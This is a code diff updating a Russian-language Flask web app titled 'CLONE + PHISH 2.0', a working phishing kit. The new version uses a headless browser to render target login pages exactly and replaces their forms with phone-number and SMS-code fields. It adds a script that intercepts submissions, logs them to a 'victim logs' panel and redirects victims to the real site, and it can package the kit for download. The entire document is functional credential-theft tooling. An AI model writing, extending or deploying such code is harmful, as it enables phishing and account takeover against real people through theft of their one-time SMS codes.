@@ -1,17 +1,23 @@
-from flask import Flask, request, send_file, jsonify
-import requests
-from bs4 import BeautifulSoup
-import os
-import shutil
+import subprocess, sys, os, time, json, re, hashlib, shutil, zipfile, threading, requests
 from urllib.parse import urljoin, urlparse
-import zipfile
-import time
-import re
-import hashlib
-import json
+from flask import Flask, request, send_file, jsonify
+from bs4 import BeautifulSoup
 
 app = Flask(__name__)
 PROJECTS = {}
+
+# Проверка и автоустановка Playwright
+def ensure_playwright():
+    try:
+        from playwright.sync_api import sync_playwright
+        return True
+    except ImportError:
+        print("Устанавливаю playwright...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "playwright"])
+        subprocess.check_call(["playwright", "install", "chromium"])
+        return True
+
+ensure_playwright()
 
 @app.route('/')
 def home():
@@ -28,8 +34,8 @@ body{background:#0a0a0f;color:#e0e0e0;font-family:Arial;min-height:100vh;display
 h1{text-align:center;font-size:28px;margin-bottom:20px;color:#667eea}
 .card{background:#111122;border-radius:16px;padding:25px;border:1px solid #222;margin-bottom:15px}
 label{display:block;margin-bottom:8px;color:#aaa;font-size:14px}
-input,select{width:100%;padding:14px;border:1px solid #333;border-radius:12px;background:#0a0a14;color:#fff;font-size:16px;margin-bottom:15px}
-input:focus,select:focus{outline:none;border-color:#667eea}
+input{width:100%;padding:14px;border:1px solid #333;border-radius:12px;background:#0a0a14;color:#fff;font-size:16px;margin-bottom:15px}
+input:focus{outline:none;border-color:#667eea}
 button{width:100%;padding:15px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;color:#fff}
 button:hover{opacity:0.85}
 .btn-clone{background:#667eea;margin-bottom:10px}
@@ -46,12 +52,12 @@ button:hover{opacity:0.85}
 </head>
 <body>
 <div class="box">
-<h1>CLONE + PHISH</h1>
+<h1>CLONE + PHISH 2.0</h1>
 <div class="card">
 <label>Ссылка на сайт</label>
 <input type="text" id="url" placeholder="https://example.com/login">
 <button class="btn-clone" onclick="doClone()">СКОПИРОВАТЬ САЙТ</button>
-<button class="btn-phish" onclick="doPhish()">СДЕЛАТЬ ФИШИНГ</button>
+<button class="btn-phish" onclick="doPhish()">ФИШИНГ (точная копия)</button>
 </div>
 <div class="loading" id="load"><div class="spinner"></div>Работаю...</div>
 <div class="result" id="res"></div>
@@ -79,7 +85,24 @@ document.getElementById('load').style.display='none'
 </body>
 </html>'''
 
-# ========== ЗАГРУЗКА РЕСУРСОВ ==========
+# Функция рендеринга через Playwright
+def render_page(url):
+    from playwright.sync_api import sync_playwright
+    with sync_playwright() as p:
+        browser = p.chromium.launch(headless=True)
+        context = browser.new_context(
+            viewport={"width": 390, "height": 844},
+            user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
+        )
+        page = context.new_page()
+        page.goto(url, wait_until="networkidle", timeout=30000)
+        page.wait_for_timeout(3000)  # Дополнительное ожидание
+        html = page.content()
+        screenshot = page.screenshot(full_page=True)
+        browser.close()
+        return html, screenshot
+
+# Загрузка ресурсов (статических)
 def download_assets(sess, soup, base_url, out_dir):
     assets = 0
     # CSS
@@ -94,7 +117,6 @@ def download_assets(sess, soup, base_url, out_dir):
                 tag['href'] = 'assets/' + name
                 assets += 1
         except: pass
-    
     # JS
     for tag in soup.find_all('script', src=True):
         src = urljoin(base_url, tag['src'].strip())
@@ -107,7 +129,6 @@ def download_assets(sess, soup, base_url, out_dir):
                 tag['src'] = 'assets/' + name
                 assets += 1
         except: pass
-    
     # IMG
     for tag in soup.find_all('img', src=True):
         src = tag['src'].strip()
@@ -122,88 +143,49 @@ def download_assets(sess, soup, base_url, out_dir):
                 tag['src'] = 'assets/' + name
                 assets += 1
         except: pass
-    
-    # BACKGROUND IMAGES
-    for tag in soup.find_all(style=True):
-        urls = re.findall(r'url\(["\']?([^"\'()]+)["\']?\)', str(tag['style']))
-        for u in urls:
-            src = urljoin(base_url, u)
-            try:
-                ext = os.path.splitext(urlparse(src).path.split('?')[0])[1] or '.png'
-                name = 'bg_' + str(abs(hash(src)))[:8] + ext
-                r = sess.get(src, timeout=10)
-                if r.status_code == 200 and len(r.content) > 100:
-                    with open(out_dir + '/assets/' + name, 'wb') as f: f.write(r.content)
-                    tag['style'] = tag['style'].replace(u, 'assets/' + name)
-                    assets += 1
-            except: pass
-    
     return assets
 
-# ========== API CLONE ==========
+# API Clone (обычный)
 @app.route('/api/clone', methods=['POST'])
 def api_clone():
     url = (request.get_json(silent=True) or {}).get('url', '').strip()
     if not url: return jsonify({'error': 'Введите URL'}), 400
     if not url.startswith('http'): url = 'https://' + url
-    
+
     pid = 'c' + hashlib.md5((url + str(time.time())).encode()).hexdigest()[:10]
     out = '/tmp/' + pid
     os.makedirs(out + '/assets', exist_ok=True)
-    
+
     sess = requests.Session()
     sess.headers.update({
-        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
-        'Accept': 'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
         'Accept-Language': 'ru-RU,ru;q=0.9'
     })
-    
     try:
         r = sess.get(url, allow_redirects=True, timeout=20)
         if r.status_code != 200: return jsonify({'error': 'HTTP ' + str(r.status_code)}), 400
-        
         soup = BeautifulSoup(r.text, 'html.parser')
         final_url = r.url
         domain = urlparse(final_url).netloc
         assets = download_assets(sess, soup, final_url, out)
         forms = 0
-        
-        # Меняем формы
         for form in soup.find_all('form'):
             form['action'] = '/submit/' + pid
             form['method'] = 'POST'
-            # Убираем оригинальные обработчики
-            for attr in ['onsubmit', 'onclick']:
-                if form.get(attr): del form[attr]
             forms += 1
-        
-        # Сохраняем HTML
+
         html = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n'
         html += '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
         html += '<base href="/p/' + pid + '/">\n'
-        # Копируем ВСЕ теги из head
         head = soup.find('head')
         if head:
             for tag in head.find_all(True):
-                if tag.name not in ['script', 'link', 'meta', 'title', 'style']: continue
-                html += str(tag) + '\n'
-        html += '</head>\n'
-        
-        body = soup.find('body')
-        if body:
-            # Убираем скрипты которые могут мешать
-            for script in body.find_all('script'):
-                if script.get('src') and any(x in script['src'] for x in ['analytics', 'gtag', 'metric']):
-                    script.decompose()
-            html += str(body)
-        else:
-            html += str(soup)
-        html += '\n</html>'
-        
+                if tag.name in ['meta', 'title', 'link', 'style', 'script']:
+                    html += str(tag) + '\n'
+        html += '</head>\n' + (str(soup.find('body')) if soup.find('body') else str(soup)) + '\n</html>'
+
         with open(out + '/index.html', 'w', encoding='utf-8') as f: f.write(html)
-        
         PROJECTS[pid] = {'url': url, 'domain': domain, 'dir': out, 'assets': assets, 'forms': forms, 'logs': [], 'type': 'clone'}
-        
         host = request.host_url.rstrip('/')
         return jsonify({
             'id': pid, 'url': host + '/p/' + pid, 'download': host + '/api/download/' + pid,
@@ -212,95 +194,89 @@ def api_clone():
     except Exception as e:
         return jsonify({'error': str(e)[:200]}), 500
 
-# ========== API PHISH ==========
+# API Phish с Playwright
 @app.route('/api/phish', methods=['POST'])
 def api_phish():
     url = (request.get_json(silent=True) or {}).get('url', '').strip()
     if not url: return jsonify({'error': 'Введите URL'}), 400
     if not url.startswith('http'): url = 'https://' + url
-    
+
     pid = 'p' + hashlib.md5((url + str(time.time())).encode()).hexdigest()[:10]
     out = '/tmp/' + pid
     os.makedirs(out + '/assets', exist_ok=True)
-    
-    sess = requests.Session()
-    sess.headers.update({
-        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
-        'Accept': 'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
-        'Accept-Language': 'ru-RU,ru;q=0.9'
-    })
-    
+
     try:
-        r = sess.get(url, allow_redirects=True, timeout=20)
-        if r.status_code != 200: return jsonify({'error': 'HTTP ' + str(r.status_code)}), 400
-        
-        soup = BeautifulSoup(r.text, 'html.parser')
-        final_url = r.url
-        domain = urlparse(final_url).netloc
-        assets = download_assets(sess, soup, final_url, out)
-        forms = 0
-        
-        # Находим главную форму
-        main_form = soup.find('form')
-        
-        if main_form:
-            # Очищаем форму
-            main_form.clear()
-            main_form['action'] = '/submit/' + pid
-            main_form['method'] = 'POST'
-            main_form['id'] = 'phishForm'
-            
-            # Создаём поля
-            phone_div = soup.new_tag('div')
-            phone_div['class'] = main_form.get('class', '')
-            
-            phone_label = soup.new_tag('label')
-            phone_label.string = 'Номер телефона'
-            phone_div.append(phone_label)
-            
-            phone_input = soup.new_tag('input')
-            phone_input['type'] = 'tel'
-            phone_input['name'] = 'phone'
-            phone_input['placeholder'] = '+7 (999) 123-45-67'
-            phone_input['required'] = ''
-            phone_input['style'] = 'width:100%;padding:14px;border-radius:12px;border:1px solid #ccc;font-size:16px;margin-bottom:10px'
-            phone_div.append(phone_input)
-            
-            # Код
-            code_div = soup.new_tag('div')
-            code_div['id'] = 'codeDiv'
-            code_div['style'] = 'display:none'
-            
-            code_label = soup.new_tag('label')
-            code_label.string = 'Код из SMS'
-            code_div.append(code_label)
-            
-            code_input = soup.new_tag('input')
-            code_input['type'] = 'text'
-            code_input['name'] = 'code'
-            code_input['placeholder'] = 'Введите код'
-            code_input['maxlength'] = '6'
-            code_input['style'] = 'width:100%;padding:14px;border-radius:12px;border:1px solid #ccc;font-size:16px;margin-bottom:10px'
-            code_div.append(code_input)
-            
-            # Кнопка
+        # Рендерим страницу через Playwright
+        html, screenshot = render_page(url)
+        soup = BeautifulSoup(html, 'html.parser')
+
+        # Сохраняем скриншот для предпросмотра
+        with open(out + '/preview.png', 'wb') as f: f.write(screenshot)
+
+        # Загружаем статические ресурсы
+        sess = requests.Session()
+        sess.headers.update({'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'})
+        assets = download_assets(sess, soup, url, out)
+
+        # Находим форму входа (предполагаем, что она есть)
+        # Можно искать по ключевым атрибутам: input type="tel", placeholder с номером телефона и т.д.
+        phone_input = soup.find('input', {'type': 'tel'}) or soup.find('input', {'placeholder': re.compile(r'телефон|phone', re.I)})
+        if phone_input:
+            form = phone_input.find_parent('form')
+        else:
+            form = soup.find('form')
+
+        if form:
+            # Очищаем форму и добавляем свои поля
+            form.clear()
+            form['action'] = '/submit/' + pid
+            form['method'] = 'POST'
+            form['id'] = 'phishForm'
+
+            # Пытаемся сохранить оригинальные стили формы, добавив свой ввод
+            div_phone = soup.new_tag('div')
+            div_phone['class'] = form.get('class', '')
+            label_phone = soup.new_tag('label')
+            label_phone.string = 'Номер телефона'
+            div_phone.append(label_phone)
+            phone_inp = soup.new_tag('input')
+            phone_inp['type'] = 'tel'
+            phone_inp['name'] = 'phone'
+            phone_inp['placeholder'] = '+7 999 123-45-67'
+            phone_inp['required'] = ''
+            phone_inp['style'] = 'width:100%;padding:14px;border-radius:12px;border:1px solid #ccc;font-size:16px;margin-bottom:10px'
+            div_phone.append(phone_inp)
+
+            div_code = soup.new_tag('div')
+            div_code['id'] = 'codeDiv'
+            div_code['style'] = 'display:none'
+            label_code = soup.new_tag('label')
+            label_code.string = 'Код из SMS'
+            div_code.append(label_code)
+            code_inp = soup.new_tag('input')
+            code_inp['type'] = 'text'
+            code_inp['name'] = 'code'
+            code_inp['placeholder'] = 'Введите код'
+            code_inp['maxlength'] = '6'
+            code_inp['style'] = 'width:100%;padding:14px;border-radius:12px;border:1px solid #ccc;font-size:16px;margin-bottom:10px'
+            div_code.append(code_inp)
+
             btn = soup.new_tag('button')
             btn['type'] = 'submit'
             btn['id'] = 'phishBtn'
             btn['style'] = 'width:100%;padding:15px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer'
             btn.string = 'Продолжить'
-            
-            # Собираем
-            main_form.append(phone_div)
-            main_form.append(code_div)
-            main_form.append(btn)
-            
+
+            form.append(div_phone)
+            form.append(div_code)
+            form.append(btn)
+
             # Добавляем скрипт перехвата
             script = soup.new_tag('script')
             script.string = '''
 var step=1;
 var phishId=''' + pid + '''';
-var redirectUrl=''' + json.dumps(final_url) + ''';
+var redirectUrl=''' + json.dumps(url) + ''';
 document.getElementById('phishForm').addEventListener('submit',function(e){
     e.preventDefault();
     var phone=this.querySelector('[name="phone"]').value.replace(/[^0-9]/g,'');
@@ -324,27 +300,21 @@ document.getElementById('phishForm').addEventListener('submit',function(e){
             soup.find('body').append(script) if soup.find('body') else soup.append(script)
             forms = 1
         else:
-            # Если нет формы - создаём
+            # Если форма не найдена - создать свою
             wrapper = soup.new_tag('div')
-            wrapper['style'] = 'max-width:350px;margin:50px auto;padding:30px;background:#fff;border-radius:16px;box-shadow:0 2px 20px rgba(0,0,0,0.1);text-align:center;font-family:Arial'
-            
-            wrapper.append(BeautifulSoup('<h2 style="margin-bottom:10px">Вход</h2><p style="color:#666;margin-bottom:20px">Введите номер телефона</p>', 'html.parser'))
-            
-            form = soup.new_tag('form')
-            form['action'] = '/submit/' + pid
-            form['method'] = 'POST'
-            form['id'] = 'phishForm'
-            form['style'] = 'text-align:left'
-            
-            form.append(BeautifulSoup('<label style="display:block;font-size:14px;color:#888;margin-bottom:5px">Номер телефона</label><input type="tel" name="phone" placeholder="+7 (999) 123-45-67" required style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;font-size:16px;margin-bottom:10px"><div id="codeDiv" style="display:none"><label style="display:block;font-size:14px;color:#888;margin-bottom:5px">Код из SMS</label><input type="text" name="code" placeholder="Введите код" maxlength="6" style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;font-size:16px;margin-bottom:10px"></div><button type="submit" id="phishBtn" style="width:100%;padding:15px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer">Продолжить</button>', 'html.parser'))
-            
-            wrapper.append(form)
-            
+            wrapper['style'] = 'max-width:350px;margin:50px auto;padding:30px;background:#fff;border-radius:16px;box-shadow:0 2px 20px rgba(0,0,0,0.1);text-align:center'
+            wrapper.append(BeautifulSoup('<h2>Вход</h2><p>Введите номер телефона</p>', 'html.parser'))
+            f = soup.new_tag('form')
+            f['action'] = '/submit/' + pid
+            f['method'] = 'POST'
+            f['id'] = 'phishForm'
+            f.append(BeautifulSoup('<label>Номер телефона</label><input type="tel" name="phone" placeholder="+7 999 123-45-67" required style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;font-size:16px;margin-bottom:10px"><div id="codeDiv" style="display:none"><label>Код из SMS</label><input type="text" name="code" placeholder="Введите код" maxlength="6" style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;font-size:16px;margin-bottom:10px"></div><button type="submit" id="phishBtn" style="width:100%;padding:15px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer">Продолжить</button>', 'html.parser'))
+            wrapper.append(f)
             script = soup.new_tag('script')
             script.string = '''
 var step=1;
 var phishId=''' + pid + '''';
-var redirectUrl=''' + json.dumps(final_url) + ''';
+var redirectUrl=''' + json.dumps(url) + ''';
 document.getElementById('phishForm').addEventListener('submit',function(e){
     e.preventDefault();
     var phone=this.querySelector('[name="phone"]').value.replace(/[^0-9]/g,'');
@@ -366,7 +336,6 @@ document.getElementById('phishForm').addEventListener('submit',function(e){
 });
 '''
             wrapper.append(script)
-            
             if soup.find('body'):
                 soup.find('body').clear()
                 soup.find('body').append(wrapper)
@@ -374,22 +343,20 @@ document.getElementById('phishForm').addEventListener('submit',function(e){
                 soup.clear()
                 soup.append(wrapper)
             forms = 1
-        
-        # Сохраняем
-        html = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n'
-        html += '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
-        html += '<base href="/p/' + pid + '/">\n'
+
+        html_out = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n'
+        html_out += '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
+        html_out += '<base href="/p/' + pid + '/">\n'
         head = soup.find('head')
         if head:
             for tag in head.find_all(True):
-                if tag.name in ['meta', 'title', 'link', 'style']:
-                    html += str(tag) + '\n'
-        html += '</head>\n' + (str(soup.find('body')) if soup.find('body') else str(soup)) + '\n</html>'
-        
-        with open(out + '/index.html', 'w', encoding='utf-8') as f: f.write(html)
-        
-        PROJECTS[pid] = {'url': url, 'domain': domain, 'dir': out, 'assets': assets, 'forms': forms, 'logs': [], 'type': 'phish'}
-        
+                if tag.name in ['meta', 'title', 'link', 'style', 'script']:
+                    html_out += str(tag) + '\n'
+        html_out += '</head>\n' + (str(soup.find('body')) if soup.find('body') else str(soup)) + '\n</html>'
+
+        with open(out + '/index.html', 'w', encoding='utf-8') as f: f.write(html_out)
+
+        PROJECTS[pid] = {'url': url, 'domain': urlparse(url).netloc, 'dir': out, 'assets': assets, 'forms': forms, 'logs': [], 'type': 'phish'}
         host = request.host_url.rstrip('/')
         return jsonify({
             'id': pid, 'url': host + '/p/' + pid, 'download': host + '/api/download/' + pid,
@@ -398,7 +365,7 @@ document.getElementById('phishForm').addEventListener('submit',function(e){
     except Exception as e:
         return jsonify({'error': str(e)[:200]}), 500
 
-# ========== SERVE ==========
+# Остальные маршруты остаются без изменений
 @app.route('/p/<pid>')
 def serve_page(pid):
     path = '/tmp/' + pid + '/index.html'
@@ -413,7 +380,6 @@ def serve_assets(pid, filename):
         return open(path, 'rb').read(), 200, {'Content-Type': ct}
     return 'Not found', 404
 
-# ========== SUBMIT ==========
 @app.route('/submit/<pid>', methods=['POST'])
 def submit_data(pid):
     data = dict(request.form)
@@ -423,7 +389,6 @@ def submit_data(pid):
     with open('/tmp/' + pid + '/logs.json', 'a') as f: f.write(json.dumps(data) + '\n')
     return jsonify({'status': 'ok'})
 
-# ========== LOGS PANEL ==========
 @app.route('/panel/<pid>')
 def panel(pid):
     logs = PROJECTS.get(pid, {}).get('logs', [])
@@ -433,15 +398,12 @@ def panel(pid):
         for k, v in l.items():
             log_html += '<span style="color:#ff0">' + k + ':</span> <span style="color:#0ff">' + str(v) + '</span><br>'
         log_html += '</div>'
-    
-    return '''<!DOCTYPE html>
-<html><head><meta charset="UTF-8"><title>Логи</title>
+    return '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Логи</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>*{margin:0;padding:0}body{background:#0a0a0f;color:#0f0;font-family:monospace;padding:20px}h1{font-size:18px;margin-bottom:10px}.count{color:#f00;font-size:28px;margin-bottom:15px}.empty{color:#666;text-align:center;margin-top:50px}</style>
 <script>setInterval(function(){location.reload()},5000)</script></head>
 <body><h1>ЛОГИ ЖЕРТВ</h1><div class="count">Всего: ''' + str(len(logs)) + '''</div>''' + (log_html or '<div class="empty">Ожидание...</div>') + '''</body></html>'''
 
-# ========== DOWNLOAD ==========
 @app.route('/api/download/<pid>')
 def api_download(pid):
     if pid not in PROJECTS: return 'Not found', 404
@@ -449,7 +411,6 @@ def api_download(pid):
     shutil.make_archive('/tmp/' + pid, 'zip', PROJECTS[pid]['dir'])
     return send_file(zip_path, as_attachment=True, download_name=pid + '.zip')
 
-# ========== START ==========
 if __name__ == '__main__':
     os.makedirs('/tmp', exist_ok=True)
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
